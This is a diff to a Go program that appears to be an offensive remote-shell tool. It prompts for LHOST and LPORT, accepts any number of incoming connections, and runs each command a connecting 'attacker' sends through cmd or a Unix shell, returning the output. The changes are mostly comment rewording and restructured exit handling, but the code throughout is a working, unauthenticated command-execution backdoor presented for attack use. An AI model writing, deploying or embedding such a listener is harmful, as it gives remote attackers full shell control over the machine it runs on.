@@ -17,7 +17,7 @@ var (
 )
 
 func main() {
-	// Prompt for LHOST and LPORT
+	// Ensure the program can interact well in any terminal
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Enter LHOST (Listener IP): ")
 	lhost, _ := reader.ReadString('\n')
@@ -27,7 +27,7 @@ func main() {
 	lport, _ := reader.ReadString('\n')
 	lport = strings.TrimSpace(lport)
 
-	// Display listening message
+	// Display a listening message
 	address := fmt.Sprintf("%s:%s", lhost, lport)
 	fmt.Printf("Listening on %s...\n", address)
 
@@ -39,7 +39,7 @@ func main() {
 	}
 	defer listener.Close()
 
-	// Handle multiple clients
+	// Handle multiple connections
 	for {
 		conn, err := listener.Accept()
 		if err != nil {
@@ -47,65 +47,60 @@ func main() {
 			continue
 		}
 
-		// Increment the connected client count
+		// Increment the client count
 		mu.Lock()
 		connectedClients++
 		mu.Unlock()
 
-		// Print client connection message
 		fmt.Printf("Connection established with %s\n", conn.RemoteAddr().String())
 		go handleConnection(conn)
 	}
 }
 
-// Handle the communication with the connected client
 func handleConnection(conn net.Conn) {
 	defer conn.Close()
 
-	// Create a buffer for reading commands from the attacker
+	// Create a buffer for reading commands from the client
 	reader := bufio.NewReader(conn)
 
 	for {
-		// Send a prompt to the attacker
+		// Display prompt to attacker
 		conn.Write([]byte("Shell> "))
 
-		// Read the command from the attacker
+		// Read input command
 		command, err := reader.ReadString('\n')
 		if err != nil {
-			fmt.Println("Error reading from connection:", err)
-			break
-		}
-
-		// Trim the newline character
-		command = strings.TrimSpace(command)
-
-		// Exit condition
-		if command == "exit" {
-			// Decrement the client count when the connection closes
+			fmt.Printf("Connection closed with %s\n", conn.RemoteAddr().String())
 			mu.Lock()
 			connectedClients--
 			mu.Unlock()
-
-			fmt.Printf("Connection closed with %s\n", conn.RemoteAddr().String())
 			break
 		}
 
-		// Execute the command and send back the result
+		// Execute the received command
+		command = strings.TrimSpace(command)
+		if command == "exit" {
+			fmt.Printf("Connection closed with %s\n", conn.RemoteAddr().String())
+			mu.Lock()
+			connectedClients--
+			mu.Unlock()
+			break
+		}
+
 		output := executeCommand(command)
 		conn.Write([]byte(output + "\n"))
 
-		// Display the current user count
+		// Update users count
 		mu.Lock()
 		fmt.Printf("USERS: %d\n", connectedClients)
 		mu.Unlock()
 	}
 }
 
-// Function to execute the command on the server
 func executeCommand(command string) string {
 	var cmd *exec.Cmd
 
-	// Use the appropriate shell for the OS
+	// Select shell based on OS
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/C", command)
 	} else {
@@ -113,7 +108,6 @@ func executeCommand(command string) string {
 	}
 
 	output, err := cmd.CombinedOutput()
-
 	if err != nil {
 		return fmt.Sprintf("Error executing command: %v\n%s", err, string(output))
 	}
